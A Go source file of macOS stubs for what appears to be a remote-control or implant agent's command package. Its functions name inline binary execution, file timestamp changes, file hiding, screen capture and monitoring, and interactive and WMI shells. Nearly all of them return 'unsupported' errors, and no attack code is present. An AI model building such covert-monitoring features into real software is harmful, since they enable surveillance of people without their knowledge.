//go:build darwin
// +build darwin

package commands

import (
	"errors"
	"os"
	"time"
)

// ================ Darwin 桩实现（Linux 特有功能在 macOS 上返回明确错误） ================

func InlineBin(assemblyBytes []byte, arguments string) ([]byte, error) {
	return nil, errors.New("内联二进制执行功能在Darwin平台暂不支持")
}

func ModifyFileTimeAdvanced(filePath string, newTime time.Time) error {
	return os.Chtimes(filePath, newTime, newTime)
}

// HideFile/UnhideFile 在 macOS 上未实现。原来返回 nil（静默假装成功）——
// 文件管理器会显示"已隐藏"，实际什么都没做。这里改为明确报错，
// 让 UI 如实显示失败原因（要真正实现可用 chflags hidden/nohidden）。
func HideFile(filePath string) error {
	return errors.New("隐藏文件功能在Darwin平台暂不支持")
}

func UnhideFile(filePath string) error {
	return errors.New("取消隐藏文件功能在Darwin平台暂不支持")
}

func TakeScreenshot(quality int) ([]byte, error) {
	return nil, errors.New("屏幕截图功能在Darwin平台暂不支持")
}

func StartScreenMonitor(frameRate int) error {
	return errors.New("屏幕监控功能在Darwin平台暂不支持")
}

func StopScreenMonitor() error {
	// StartScreenMonitor 在 Darwin 已明确报不支持，Stop 原来返回 nil 会让 UI
	// 显示"已停止"；保持与 Start 一致，如实报错。
	return errors.New("屏幕监控功能在Darwin平台暂不支持")
}

func GetMonitorFrame() ([]byte, error) {
	return nil, errors.New("屏幕监控功能在Darwin平台暂不支持")
}

func StartInteractiveShell() ([]byte, error) {
	return nil, errors.New("交互式终端功能在Darwin平台暂不支持")
}

func SendInteractiveInput(input []byte) ([]byte, error) {
	return nil, errors.New("交互式终端功能在Darwin平台暂不支持")
}
func StopInteractiveShell() ([]byte, error) {
	return nil, errors.New("交互式终端功能在Darwin平台暂不支持")
}

func StartCMDInteractiveShell() ([]byte, error) {
	return nil, errors.New("双引擎交互式Shell功能在Darwin平台不可用")
}

func SendDualInteractiveInput(input []byte) ([]byte, error) {
	return nil, errors.New("双引擎交互式Shell功能在Darwin平台不可用")
}

func StopDualInteractiveShell() ([]byte, error) {
	return nil, errors.New("双引擎交互式Shell功能在Darwin平台不可用")
}

func StartWMIInteractiveShell() ([]byte, error) {
	return nil, errors.New("双引擎交互式Shell功能在Darwin平台不可用")
}
